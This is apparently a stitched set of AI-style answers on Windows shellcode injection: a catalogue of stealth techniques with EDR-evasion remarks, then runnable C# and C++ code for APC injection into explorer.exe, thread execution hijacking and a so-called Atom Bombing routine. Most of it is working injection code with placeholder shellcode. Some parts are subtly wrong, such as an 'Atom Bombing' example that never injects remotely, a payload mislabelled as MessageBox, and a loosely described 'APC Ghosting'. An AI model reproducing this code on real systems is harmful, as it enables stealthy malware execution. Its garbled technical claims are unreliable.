
Shellcode injection techniques are methods used to execute arbitrary code (shellcode) within the address space of a running process. While some techniques like `CreateRemoteThread`, `VirtualAllocEx`, and `WriteProcessMemory` are well-known, there are several lesser-known or more sophisticated techniques that can be used to achieve the same goal. Below are some of these lesser-known techniques:

### 1. **QueueUserAPC Injection**
   - **Description:** This technique leverages the `QueueUserAPC` function to queue a user-mode Asynchronous Procedure Call (APC) to a thread in a remote process. When the thread enters an alertable state, the APC is executed, running the shellcode.
   - **Use Case:** This technique is useful for injecting code into a remote process without creating a new thread, making it less noisy.
   - **Example:**
     ```csharp
     QueueUserAPC(shellcodePtr, threadHandle, IntPtr.Zero);
     ```

### 2. **SetWindowsHookEx Injection**
   - **Description:** `SetWindowsHookEx` is used to install a hook procedure that can monitor system events. A malicious hook procedure can be set to inject shellcode into the address space of a target process.
   - **Use Case:** This is often used for injecting code into GUI applications, as hooks are typically associated with user interface events.
   - **Example:** Injecting a WH_KEYBOARD or WH_MOUSE hook.
   
### 3. **Process Hollowing**
   - **Description:** Process hollowing is a technique where a legitimate process is created in a suspended state, its memory is unmapped, and the memory is replaced with malicious code. The process is then resumed, executing the shellcode in the context of the legitimate process.
   - **Use Case:** Often used for stealth, as the running process appears legitimate.
   - **Example:** Unmap the memory of a process created with `CreateProcess` and replace it with malicious code.

### 4. **Thread Execution Hijacking**
   - **Description:** This technique involves suspending a thread, changing its context to point to shellcode, and then resuming the thread. This hijacks the thread's execution to run the shellcode.
   - **Use Case:** Useful for executing code in a remote process without creating new threads.
   - **Example:** Use `SuspendThread`, `GetThreadContext`, `SetThreadContext`, and `ResumeThread` functions.

### 5. **NtQueueApcThread/NtTestAlert**
   - **Description:** Similar to `QueueUserAPC`, but using the native `NtQueueApcThread` function to queue an APC directly. Combined with `NtTestAlert`, it can be used to force a thread to enter an alertable state, executing the queued APC.
   - **Use Case:** Provides more control and is less detectable than standard APC injection.
   - **Example:**
     ```csharp
     NtQueueApcThread(threadHandle, shellcodePtr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
     NtTestAlert();
     ```

### 6. **Image File Execution Options (IFEO) Hijacking**
   - **Description:** By modifying registry entries related to Image File Execution Options (IFEO), you can hijack a process startup to run arbitrary code or debugger.
   - **Use Case:** Typically used for persistence but can be used to inject code into processes on startup.
   - **Example:** Modify `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\process.exe` to point to a malicious debugger.

### 7. **Atom Bombing**
   - **Description:** This technique involves using the Global Atom Table to store shellcode, which is then accessed via asynchronous procedure calls (APC) or similar mechanisms.
   - **Use Case:** This is a lesser-known and complex technique that avoids using typical API calls that are monitored by security tools.
   - **Example:** Store shellcode in a global atom, retrieve it, and execute it within the context of a target process.

### 8. **Callback Injection (e.g., EnumSystemLocalesEx)**
   - **Description:** Certain Windows API functions allow user-defined callback functions (e.g., `EnumSystemLocalesEx`). By pointing such a callback to shellcode, you can execute arbitrary code.
   - **Use Case:** Useful in situations where creating new threads is restricted or heavily monitored.
   - **Example:** Register a malicious callback using `EnumSystemLocalesEx`.

### 9. **Direct Kernel Object Manipulation (DKOM)**
   - **Description:** Involves manipulating kernel objects directly to inject shellcode, often used for rootkits.
   - **Use Case:** Extremely stealthy, typically used in kernel-level attacks or for advanced persistence.
   - **Example:** Modify the EPROCESS structure to hide or inject code.

### 10. **COM Hijacking**
   - **Description:** By registering a COM object or hijacking an existing one, an attacker can force a target application to load and execute malicious code.
   - **Use Case:** Can be used for persistence and to trigger code execution in high-privilege applications.
   - **Example:** Hijack a known COM object like `MMC20.Application` to execute shellcode.

### 11. **Reflective DLL Injection**
   - **Description:** This technique involves injecting a DLL into a process without using the Windows loader. The DLL is loaded and executed entirely from memory, which can include executing shellcode.
   - **Use Case:** Avoids touching disk and is less likely to be detected by file-based monitoring.
   - **Example:** Load a DLL into memory and call its entry point using custom loader code.

### 12. **Early Bird Injection**
   - **Description:** Similar to Process Hollowing, but the shellcode is injected during the early stages of a process startup (before the process fully initializes).
   - **Use Case:** The injected code executes before the process initialization, which can bypass certain security mechanisms.
   - **Example:** Use `NtCreateSection`, `NtMapViewOfSection`, and other native APIs during process creation.

### 13. **APC Ghosting**
   - **Description:** A more advanced form of APC injection where the shellcode is injected into a thread's APC queue and then the thread's memory is manipulated to hide the injection.
   - **Use Case:** Used for stealthy code execution.
   - **Example:** Manipulate the APC queue and thread context to hide the shellcode.

### Security Considerations

- **Detection:** Even lesser-known techniques can be detected by sophisticated endpoint detection and response (EDR) systems, especially those that monitor memory operations and API calls.
- **Complexity:** Implementing these techniques often requires a deep understanding of Windows internals, memory management, and kernel-level programming.
- **Legality:** Unauthorized use of these techniques, especially in a production environment, is illegal and unethical. Always ensure you have explicit permission when testing security or performing penetration testing.

These techniques demonstrate the depth and variety of methods available for executing shellcode, each with different trade-offs in terms of stealth, complexity, and detection resistance.


### **Atom Bombing Example**

**Atom Bombing** is a technique where shellcode is stored in the global atom table and then executed through various indirect means. Atom tables are system-wide storage for strings or binary data that can be referenced by identifiers (atoms). Although it doesn’t rely on typical API calls monitored by security tools, Atom Bombing can be challenging to implement and detect.

Here’s a simplified example in C# that demonstrates storing shellcode in an atom and then retrieving it to execute:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;

class AtomBombing
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern ushort GlobalAddAtom(string lpString);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GlobalGetAtomName(ushort nAtom, StringBuilder lpBuffer, int nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern ushort GlobalDeleteAtom(ushort nAtom);

    public static void Main()
    {
        // Example shellcode that opens a MessageBox
        byte[] shellcode = new byte[] {
            0x6a, 0x00, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54,
            0x53, 0xb8, 0xc7, 0x93, 0xbf, 0x77, 0xff, 0xd0
        };

        // Convert the shellcode to a string (less than 255 characters)
        string shellcodeString = Encoding.ASCII.GetString(shellcode);

        // Store the shellcode in the global atom table
        ushort atom = GlobalAddAtom(shellcodeString);
        if (atom == 0)
        {
            Console.WriteLine("GlobalAddAtom failed");
            return;
        }

        // Retrieve the shellcode from the global atom table
        StringBuilder retrievedShellcode = new StringBuilder(255);
        GlobalGetAtomName(atom, retrievedShellcode, retrievedShellcode.Capacity);

        // Execute the shellcode (simple example, in reality you would use different techniques to execute it)
        IntPtr shellcodePtr = Marshal.StringToHGlobalAnsi(retrievedShellcode.ToString());
        ExecuteShellcode(shellcodePtr);

        // Clean up
        GlobalDeleteAtom(atom);
    }

    private static void ExecuteShellcode(IntPtr shellcodePtr)
    {
        // Change the memory protection to executable
        uint oldProtect;
        VirtualProtect(shellcodePtr, (UIntPtr)0x1000, 0x40, out oldProtect);

        // Execute the shellcode
        var thread = CreateThread(IntPtr.Zero, 0, shellcodePtr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
```

**Explanation:**
1. **GlobalAddAtom:** Stores the shellcode in the global atom table.
2. **GlobalGetAtomName:** Retrieves the shellcode from the atom table.
3. **VirtualProtect:** Changes the memory protection to `PAGE_EXECUTE_READWRITE` to allow code execution.
4. **CreateThread:** Creates a new thread to execute the shellcode.
5. **WaitForSingleObject:** Waits for the thread to finish execution.

### **APC Ghosting Example**

**APC Ghosting** is a more advanced and stealthy technique of code injection. It involves injecting a shellcode into a thread’s Asynchronous Procedure Call (APC) queue and then hiding or altering the thread’s context to avoid detection.

Here's a simplified example of how APC injection might look in C#. Note that implementing APC Ghosting (hiding the APC from detection) requires lower-level manipulation of thread context that can be complex and is typically done in C or C++ rather than C#.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class APCGhosting
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    static void Main()
    {
        // Example shellcode (MessageBoxA)
        byte[] shellcode = new byte[] {
            0x6a, 0x00, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54,
            0x53, 0xb8, 0xc7, 0x93, 0xbf, 0x77, 0xff, 0xd0
        };

        // Get the target process (e.g., explorer.exe)
        Process targetProcess = Process.GetProcessesByName("explorer")[0];
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, targetProcess.Id);

        // Allocate memory in the target process
        IntPtr allocAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);

        // Write the shellcode into the allocated memory
        UIntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

        // Find a thread in the target process
        ProcessThreadCollection threads = targetProcess.Threads;
        IntPtr hThread = OpenThread(0x001F03FF, false, (uint)threads[0].Id);

        // Queue an APC in the thread to execute the shellcode
        QueueUserAPC(allocAddress, hThread, IntPtr.Zero);

        Console.WriteLine("APC queued in the target thread.");
    }
}
```

**Explanation:**
1. **OpenProcess:** Opens a handle to the target process (e.g., `explorer.exe`).
2. **VirtualAllocEx:** Allocates memory in the target process.
3. **WriteProcessMemory:** Writes the shellcode into the allocated memory.
4. **OpenThread:** Opens a handle to a thread within the target process.
5. **QueueUserAPC:** Queues an APC in the thread to execute the shellcode when the thread enters an alertable state.

**Notes on APC Ghosting:**
- **Hiding the APC:** APC Ghosting involves not just queuing the APC, but manipulating the thread context to obscure the fact that the APC was ever queued. This might involve advanced techniques such as altering the APC structures or hiding the modifications to the thread context. This is typically done in C or C++ rather than C# because it requires low-level access to the Windows kernel.
- **Detection:** While both of these techniques are stealthier than traditional injection methods, they can still be detected by advanced security tools that monitor process memory, thread states, or atom table usage.

Both **Atom Bombing** and **APC Ghosting** are advanced techniques that require a deep understanding of Windows internals and are typically used by sophisticated attackers to bypass security mechanisms. These examples are simplified and intended for educational purposes only.


A thread enters an **alertable state** in Windows when it is waiting for certain types of events and has indicated that it is willing to process Asynchronous Procedure Calls (APCs) while it waits. In an alertable state, the thread can process queued APCs and perform actions immediately, even while it is technically in a waiting state.

### Ways a Thread Enters an Alertable State

1. **SleepEx Function:**
   - The `SleepEx` function suspends the execution of the current thread for a specified interval. If the `bAlertable` parameter is set to `TRUE`, the thread enters an alertable state.
   
   ```c
   SleepEx(DWORD dwMilliseconds, BOOL bAlertable);
   ```
   
   - Example in C:
     ```c
     // Sleep for 1000 milliseconds in an alertable state
     SleepEx(1000, TRUE);
     ```

2. **WaitForSingleObjectEx Function:**
   - This function waits for a specified object to be in the signaled state or for a time-out interval to elapse. If the `bAlertable` parameter is set to `TRUE`, the thread enters an alertable state.
   
   ```c
   WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
   ```

   - Example in C:
     ```c
     // Wait for a handle to be signaled in an alertable state
     WaitForSingleObjectEx(hHandle, INFINITE, TRUE);
     ```

3. **WaitForMultipleObjectsEx Function:**
   - Similar to `WaitForSingleObjectEx`, this function waits until one or all of the specified objects are in the signaled state. If the `bAlertable` parameter is set to `TRUE`, the thread enters an alertable state.
   
   ```c
   WaitForMultipleObjectsEx(DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds, BOOL bAlertable);
   ```

   - Example in C:
     ```c
     // Wait for any one of multiple handles to be signaled in an alertable state
     WaitForMultipleObjectsEx(nCount, lpHandles, FALSE, INFINITE, TRUE);
     ```

4. **MsgWaitForMultipleObjectsEx Function:**
   - This function combines the ability to wait for a message queue event and object handles, and allows a thread to enter an alertable state.
   
   ```c
   MsgWaitForMultipleObjectsEx(DWORD nCount, const HANDLE* pHandles, DWORD dwMilliseconds, DWORD dwWakeMask, DWORD dwFlags);
   ```

   - Example in C:
     ```c
     // Wait for a message or object handle to be signaled in an alertable state
     MsgWaitForMultipleObjectsEx(nCount, pHandles, INFINITE, QS_ALLEVENTS, MWMO_ALERTABLE);
     ```

5. **SignalObjectAndWait Function:**
   - This function signals one object and then waits for another object to enter the signaled state. If `bAlertable` is set to `TRUE`, the thread enters an alertable state.
   
   ```c
   SignalObjectAndWait(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable);
   ```

   - Example in C:
     ```c
     // Signal an object and then wait in an alertable state
     SignalObjectAndWait(hObjectToSignal, hObjectToWaitOn, INFINITE, TRUE);
     ```

### How APCs Work with Alertable States

APCs (Asynchronous Procedure Calls) are queued to a thread by using functions like `QueueUserAPC`. When the thread enters an alertable state via one of the above functions, the system will check for any queued APCs. If any are present, the thread will execute the APCs before resuming its normal execution path.

### Practical Example

Here's an example in C where a thread enters an alertable state and processes an APC:

```c
#include <windows.h>
#include <stdio.h>

// APC function
void CALLBACK MyAPCProc(ULONG_PTR dwParam) {
    printf("APC executed: %d\n", dwParam);
}

int main() {
    // Queue an APC to the current thread
    QueueUserAPC(MyAPCProc, GetCurrentThread(), 1);

    // Enter an alertable state and wait indefinitely
    SleepEx(INFINITE, TRUE);

    printf("Thread woke up from alertable state\n");
    return 0;
}
```

### Explanation:
- **QueueUserAPC:** Queues an APC (`MyAPCProc`) to the current thread.
- **SleepEx:** Puts the thread to sleep in an alertable state. Because the `bAlertable` parameter is `TRUE`, the thread will execute the queued APC before resuming.

### Summary

A thread enters an alertable state when it explicitly requests to process APCs while waiting for an event or a time-out. This is critical for APC-based code injection techniques, as the queued APC will only be executed when the thread is in such a state. Using these methods, an attacker can inject code that will run within the context of a target process, provided that the thread enters an alertable state.


### **Thread Execution Hijacking Overview**

Thread Execution Hijacking is a technique where an attacker suspends a thread in a target process, modifies its execution context (e.g., to point to malicious code), and then resumes the thread. This allows the attacker to execute arbitrary code within the context of the hijacked thread.

This technique is more commonly implemented in C++ due to the low-level access required for manipulating thread contexts, but I'll provide examples in both C# and C++.

### **Thread Execution Hijacking in C#**

C# provides access to the necessary APIs via P/Invoke, but the technique is more straightforward in C++. Here's how you can achieve it in C#:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    // Import necessary Windows API functions
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    // Define necessary constants and structures
    const uint THREAD_SUSPEND_RESUME = 0x0002;
    const uint THREAD_GET_CONTEXT = 0x0008;
    const uint THREAD_SET_CONTEXT = 0x0010;
    const uint THREAD_QUERY_INFORMATION = 0x0040;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_READ = 0x0010;

    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT
    {
        public uint ContextFlags; // Flag indicating the parts of the context to be set or retrieved
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip; // Instruction pointer
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
    }

    static void Main(string[] args)
    {
        // Replace with the target process ID and thread ID
        int targetProcessId = 1234;
        uint targetThreadId = 5678;

        // Open the target process
        IntPtr hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcessId);

        // Open the target thread
        IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, false, targetThreadId);

        // Suspend the thread
        SuspendThread(hThread);

        // Get the thread context
        CONTEXT context = new CONTEXT();
        context.ContextFlags = 0x10007; // CONTEXT_FULL
        GetThreadContext(hThread, ref context);

        // Print the current EIP (instruction pointer)
        Console.WriteLine("Current EIP: 0x" + context.Eip.ToString("X8"));

        // Modify the EIP to point to the new shellcode
        byte[] shellcode = new byte[] {
            0x90, 0x90, 0x90, 0x90, // NOP sled
            0xCC                    // Int3 breakpoint (for demonstration purposes)
        };

        IntPtr remoteShellcode = Marshal.AllocHGlobal(shellcode.Length);
        Marshal.Copy(shellcode, 0, remoteShellcode, shellcode.Length);

        IntPtr bytesWritten;
        WriteProcessMemory(hProcess, new IntPtr(context.Eip), shellcode, (uint)shellcode.Length, out bytesWritten);

        // Set the modified context back to the thread
        SetThreadContext(hThread, ref context);

        // Resume the thread
        ResumeThread(hThread);

        Console.WriteLine("Thread hijacked and resumed.");
    }
}
```

### **Thread Execution Hijacking in C++**

The C++ example provides more direct access to Windows APIs and is generally preferred for such low-level operations:

```cpp
#include <windows.h>
#include <iostream>

// Shellcode to be executed
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, // NOP sled
    0xCC                    // Int3 breakpoint (for demonstration purposes)
};

int main()
{
    // Replace these with the target process ID and thread ID
    DWORD targetProcessId = 1234;
    DWORD targetThreadId = 5678;

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetProcessId);
    if (hProcess == NULL) {
        std::cerr << "Failed to open target process." << std::endl;
        return 1;
    }

    // Open the target thread
    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, targetThreadId);
    if (hThread == NULL) {
        std::cerr << "Failed to open target thread." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Suspend the thread
    SuspendThread(hThread);

    // Get the thread context
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &context)) {
        std::cerr << "Failed to get thread context." << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Print the current EIP (instruction pointer)
    std::cout << "Current EIP: 0x" << std::hex << context.Eip << std::endl;

    // Allocate memory in the target process for the shellcode
    LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteShellcode == NULL) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode to the allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, sizeof(shellcode), &bytesWritten)) {
        std::cerr << "Failed to write shellcode to target process." << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Modify the EIP to point to the shellcode
    context.Eip = (DWORD)remoteShellcode;

    // Set the modified context back to the thread
    if (!SetThreadContext(hThread, &context)) {
        std::cerr << "Failed to set thread context." << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Resume the thread
    ResumeThread(hThread);

    std::cout << "Thread hijacked and resumed." << std::endl;

    // Clean up
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

### **Explanation:**

- **OpenThread/OpenProcess:** Opens a handle to the target thread and process, respectively, with the required permissions.
- **SuspendThread:** Suspends the thread to allow manipulation of its context.
- **GetThreadContext:** Retrieves the current execution context of the thread, including the `EIP` register (Instruction Pointer).
- **VirtualAllocEx:** Allocates memory in the target process for the shellcode.
- **WriteProcessMemory:** Writes the shellcode into the allocated memory in the target process.
- **SetThreadContext:** Modifies the thread's `EIP` to point to the shellcode.
- **ResumeThread:** Resumes the thread, causing it to execute the shellcode.

### **Security Considerations:**

- **Privileges:** This technique requires significant privileges (such as `SeDebugPrivilege`) and is typically performed by malware or during authorized penetration testing.
- **Detection:** Modern Endpoint Detection and Response (EDR) solutions may detect this technique, as it involves suspicious API calls and thread manipulation.
- **Legality:** Unauthorized use of this technique is illegal and unethical. It should only be used in controlled environments with explicit permission.
